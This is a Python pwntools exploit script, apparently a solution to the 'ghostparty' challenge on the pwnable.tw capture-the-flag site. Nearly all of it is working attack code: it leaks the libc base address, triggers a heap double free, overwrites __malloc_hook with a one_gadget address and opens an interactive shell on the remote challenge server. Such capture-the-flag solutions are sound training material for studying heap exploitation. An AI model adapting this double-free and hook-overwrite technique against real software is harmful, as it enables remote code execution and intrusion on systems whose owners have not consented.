from pwn import *

elf = ELF("ghostparty")
libc = ELF("libc_64.so.6")
r = remote('chall.pwnable.tw', 10401)


def add_vampire(name, age, message, blood, actrn, final=False):
    r.recvuntil('Your choice :')
    r.sendline('1')
    r.recvuntil('Name : ')
    r.sendline(name)
    r.recvuntil('Age : ')
    r.sendline(str(age))
    r.recvuntil('Message : ')
    r.sendline(message)
    r.recvuntil('Choose a type of ghost :')
    r.sendline('7')
    if final:
        return
    r.recvuntil('Add blood :')
    r.sendline(blood)
    r.recvuntil('Your choice : ')
    r.sendline(str(actrn))


def add_skull(name, age, message, bones, actrn):
    r.recvuntil('Your choice :')
    r.sendline('1')
    r.recvuntil('Name : ')
    r.sendline(name)
    r.recvuntil('Age : ')
    r.sendline(str(age))
    r.recvuntil('Message : ')
    r.sendline(message)
    r.recvuntil('Choose a type of ghost :')
    r.sendline('4')
    r.recvuntil('How many bones ? : ')
    r.sendline(str(bones))
    r.recvuntil('Your choice : ')
    r.sendline(str(actrn))


def add_mummy(name, age, message, bandage, actrn):
    r.recvuntil('Your choice :')
    r.sendline('1')
    r.recvuntil('Name : ')
    r.sendline(name)
    r.recvuntil('Age : ')
    r.sendline(str(age))
    r.recvuntil('Message : ')
    r.sendline(message)
    r.recvuntil('Choose a type of ghost :')
    r.sendline('5')
    r.recvuntil('Commit on bandage : ')
    r.sendline(bandage)
    r.recvuntil('Your choice : ')
    r.sendline(str(actrn))


def listghost(index):
    r.recvuntil('Your choice :')
    r.sendline('2')
    r.recvuntil('Choose a ghost which you want to show in the party : ')
    r.sendline(str(index))
    r.recvuntil('Blood : ')
    return u64(r.recv(6) + b'\0\0')


def remove_ghost(index):
    r.recvuntil('Your choice :')
    r.sendline('4')
    r.recvuntil('Choose a ghost which you want to remove from the party : ')
    r.sendline(str(index))


with log.progress("leaking libc_base") as l:
    add_vampire('A', 1, 'A', 'A' * 0x88, 1)
    add_vampire('A', 1, 'A', '\x01', 1)
    libc_base = listghost(1) - 0x3c3b01
    l.success(hex(libc_base))


with log.progress("overwriting address") as l:
    add_skull('A', 1, 'A', 0, 1)
    add_vampire('A', 1, 'A', 'A' * 0x67, 3)  # free name
    l.status("double free")
    remove_ghost(2)
    remove_ghost(2)  # free name again -> double free
    remove_ghost(1)
    malloc_hook = libc_base + 0x3c3aed
    one_gadget = libc_base + 0xf0567

    l.status("overwriting __malloc_hook")
    add_vampire(p64(malloc_hook).ljust(0x67, b'\0'), 1, 'A', 'A', 1)
    add_vampire('A' * 0x67, 1, 'A', 'A', 1)
    add_skull('A', 1, 'A', 0, 1)

    payload = b'\0' * 0x13 + p64(one_gadget)
    # overwrite __malloc_hook with one gadget
    add_vampire(payload.ljust(0x67, b'\0'), 1, '', 'A', 1, True)  # '' is used to make [rsp + 0x70] == 0

r.interactive()
